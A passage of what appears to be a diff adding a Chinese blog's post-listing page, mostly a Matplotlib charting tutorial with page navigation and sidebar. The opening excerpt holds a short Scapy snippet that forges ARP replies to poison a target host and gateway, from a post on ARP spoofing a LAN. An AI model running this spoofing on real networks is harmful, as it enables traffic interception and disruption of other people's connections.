+<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br />通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为默认网关的IP</span></span><br><span class="line"><span class="string">	源MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">	目的IP为需要毒化主机的IP</span></span><br><span class="line"><span class="string">	目的MAC为需要毒化主机的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pkgtoHost=Ether(src=localmac,dst=tgmac)/ARP(op=<span class="number">2</span>,hwsrc=localmac,psrc=gatewayip,hwdst=tgmac,pdst=tgip)</span><br><span class="line">gatewayMac=getmacbyip(gatewayip)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为被攻击主机的IP</span></span><br><span class="line"><span class="string">	源MAC为本机MAC</span></span><br><span class="line"><span class="string">	目的IP为默认网关的IP</span></span><br><span class="line"><span class="string">	目的MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pkgtoGateway=Ether(src=localmac,dst=gatewayMac)/ARP(hwdst=gatewayMac,pdst=gatewayip,psrc=tgip,hwsrc=localmac,op=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h2><blockquote>
+<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
+</blockquote>
+
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" title="Python实现ARP欺骗屏蔽局域网">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/7.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="../../categories/Linux/">Linux</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/07/18/play_Linux/">
+    		玩转Linux
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-07-18T04:53:27.000Z">2019-07-18</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <p>有趣的Linux技巧</p>
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/07/18/play_Linux/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/07/18/play_Linux/" title="玩转Linux">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/8.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/">
+    		Matplotlib图标绘制摘要
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-05-03T00:18:25.000Z">2019-05-03</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <p>目录</p>
+<p>散点图：用于描述两个变量的相关性—–scatter<br>折线图：多用于描述变量随时间的变化—–plot<br>条形图:比较多个项目分类的数据大小<br>直方图：表示数据的分布情况（连续）<br>饼状图：显示各项大小与总和的比例<br>箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值</p>
+<hr>
+<h1 id="散点图：用于描述两个变量的相关性—–scatter"><a href="#散点图：用于描述两个变量的相关性—–scatter" class="headerlink" title="散点图：用于描述两个变量的相关性—–scatter"></a>散点图：用于描述两个变量的相关性—–scatter</h1><p>scatter(x, y, s=None, c=None, marker=None, cmap=None, norm=None,vmin=None, vmax=None,alpha=None, linewidths=None, verts=None,edgecolors=None, <em>, data=None, *</em>kwargs)</p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+
+#随机正相关
+m=np.random.randn(1000)
+n=m+np.random.randn(1000)*0.5
+plt.scatter(m,n)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085417215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="随机正相关散点图"></p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+
+#随机不相关
+x=np.random.randn(1000)
+y=np.random.randn(1000)
+
+plt.scatter(x,y)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085354320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="随机不相关散点图"></p>
+<p>界面定制：  </p>
+<pre><code>#s:点的面积
+#c：颜色
+#marker：标志形状
+#alpha：透明度
+
+plt.scatter(x,y,s=100,c=&apos;r&apos;,marker=&apos;X&apos;,alpha=0.5)
+
+#marker的种类：https://matplotlib.org/api/markers_api.html?highlight=marker#module-matplotlib.markers</code></pre><p>折线图：多用于描述变量随时间的变化—–plot</p>
+<p>def plot_date(x, y, fmt=’o’, tz=None, xdate=True, ydate=False, <em>,data=None, *</em>kwargs)</p>
+<pre><code>#def plot(*args, scalex=True, scaley=True, data=None, **kwargs)
+import numpy as np
+import matplotlib.pyplot as plt
+#折线图
+#生成从-10~10平均等分的100个数
+x=np.linspace(-10,10,100)
+y=x**2
+plt.plot(x,y)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/2019050208582070.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="折线图"></p>
+<p>文件中有日期的折线图：</p>
+<p>1、converters={0:mdate.strpdate2num(‘%Y’)}</p>
+<p>2、plt.plot_date()</p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+import matplotlib.dates as mdate
+
+#北京房价折线图
+date,beijing,tianjing,shijiazhuang=np.loadtxt(&apos;demo.csv&apos;,delimiter=&apos;,&apos;,converters={0:mdate.strpdate2num(&apos;%Y&apos;)},skiprows=1,usecols=(0,1,2,3),unpack=True,encoding=&apos;GBK&apos;)
+
+
+#skiprows:从第几行开始导入
+#usecols:导入第几列
+#unpack:False-从左往右形成一行，True-从上往下形成一行
+#delimiter:csv中每个数据的分隔符
+
+
+plt.plot_date(date,beijing,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;red&apos;)
+plt.plot_date(date,tianjing,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;blue&apos;)
+plt.plot_date(date,shijiazhuang,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;black&apos;)
+
+#linestyle:直线、虚线
+
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085955525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="北京房价折线图"></p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+
+#画出正弦函数的图像
+x=np.linspace(-10,10,100)
+y=np.sin(x)
+plt.plot(x,y)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502090100362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="正弦函数图"></p>
+<h1 id="条形图-比较多个项目分类的数据大小"><a href="#条形图-比较多个项目分类的数据大小" class="headerlink" title="条形图:比较多个项目分类的数据大小"></a>条形图:比较多个项目分类的数据大小</h1><pre><code>import numpy as np
+import matplotlib.pyplot as plt
+#def bar(x, height, width=0.8, bottom=None, *, align=&apos;center&apos;,data=None, **kwargs):
+N=5
+#并列
+y=[22,55,33,42,60]
+index=np.arange(N)
+x=plt.bar(x=index,height=y,width=0.4,color=&apos;red&apos;)
+plt.show()</code></pre><p><img src=".https://img-blog.csdnimg.cn/20190502162220657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="并列条形图"></p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+N=5
+#并列
+y=[22,55,33,42,60]
+index=np.arange(N)
+x=plt.barh(y=index,width=y,color=&apos;red&apos;)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502164231325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="斜侧并列条形图"></p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+N=5
+#并列
+y1=[22,55,33,42,60]
+y2=[21,20,45,10,54]
+bar_width=0.3
+index=np.arange(N)
+plt.bar(x=index,height=y1,color=&apos;red&apos;,width=0.3)
+plt.bar(x=index+bar_width,height=y2,color=&apos;blue&apos;,width=0.3)
+plt.show()</code></pre><p> <img src="https://img-blog.csdnimg.cn/20190502164648339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="多列条形图"></p>
+<pre><code>import numpy as np
+import matplotlib.pyplot as plt
+N=5
+
+#层叠-就是将下层图像置为上层的buttom
+y1=[22,55,33,42,60]
+y2=[21,20,45,10,54]
+index=np.arange(N)
+plt.bar(index,y1,0.2,color=&apos;red&apos;)
+plt.bar(index,y1,0.2,y1,color=&apos;blue&apos;)
+#不能写x=index，height=y1等
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502165636710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="单列多类条形图"></p>
+<h1 id="直方图：表示数据的分布情况（连续）"><a href="#直方图：表示数据的分布情况（连续）" class="headerlink" title="直方图：表示数据的分布情况（连续）"></a>直方图：表示数据的分布情况（连续）</h1><pre><code>#直方图
+import numpy as np
+import matplotlib.pyplot as plt
+mu=100 #mean of the distrubution
+sigma=20 #standard deviation of distribution
+x=np.random.randn(2000)
+plt.hist(x,bins=10,color=&apos;red&apos;,density=False,edgecolor=&apos;k&apos;)
+#bins：多少块
+#density :是否标准化，标准化之后为频组
+#edgecolor：颜色分割线
+
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/2019050217145746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="直方图"></p>
+<pre><code>#双变量直方图
+import numpy as np
+import matplotlib.pyplot as plt
+x=np.random.randn(2000)+2
+y=np.random.randn(2000)+3
+plt.hist2d(x,y,bins=50)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502171739451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="双变量直方图"></p>
+<h1 id="饼状图：显示各项大小与总和的比例"><a href="#饼状图：显示各项大小与总和的比例" class="headerlink" title="饼状图：显示各项大小与总和的比例"></a>饼状图：显示各项大小与总和的比例</h1><pre><code>#饼状图
+import numpy as np
+import matplotlib.pyplot as plt
+labels=&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;
+fraces=[15,30,25,10]
+explode=[0,0,0,0.05]
+plt.pie(x=fraces,labels=labels,autopct=&apos;%0.f%%&apos;,explode=explode,shadow=True)
+#autopct:显示百分比
+#explode:突出显示
+#shadow:加阴影
+
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503075210153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="饼图"></p>
+<h1 id="箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值"><a href="#箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值" class="headerlink" title="箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值"></a>箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值</h1><pre><code>#箱型图
+import numpy as np
+import matplotlib.pyplot as plt
+np.random.seed(1)
+data=np.random.normal(size=1000,loc=0,scale=1)
+plt.boxplot(data,sym=&apos;x&apos;,whis=1.5)
+#sym:符号
+#whis:异常值的区域
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503081153899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="箱型图"></p>
+<pre><code>#多箱型图
+import numpy as np
+import matplotlib.pyplot as plt
+np.random.seed(1)
+data=np.random.normal(size=(1000,4),loc=0,scale=1)
+labels=[&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]
+plt.boxplot(data,sym=&apos;x&apos;,whis=1.5)
+plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503081421727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="多箱型图"></p>
+
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/" title="Matplotlib图标绘制摘要">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/3.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+
+    
+    <nav class="page-navigator">
+        <a class="extend prev" rel="prev" href="../3/">前一页</a><a class="page-number" href="../../">1</a><a class="page-number" href="../2/">2</a><a class="page-number" href="../3/">3</a><span class="page-number current">4</span>
+    </nav>
+    
+
+
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
+</div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="../../categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a>
+        <span class="badge">(3)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
+        <span class="badge">(7)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E5%AE%B9%E5%99%A8/">容器</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/Linux/">Linux</a>
+        <span class="badge">(7)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/">路由技术</a>
+        <span class="badge">(3)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E6%95%85%E9%9A%9C/">故障</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="../../categories/%E8%BF%90%E7%BB%B4/">运维</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">快捷键 (6)</a>
+  
+    <a class="tag-item" href="../../tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔 (1)</a>
+  
+    <a class="tag-item" href="../../tags/%E6%91%98%E5%BD%95/" title="摘录">摘录 (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2020
+    
+
+    <a href="../../index.html">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="../../js/main.js?v=1593076679088.js"></script>
+
+</body>
+</html>
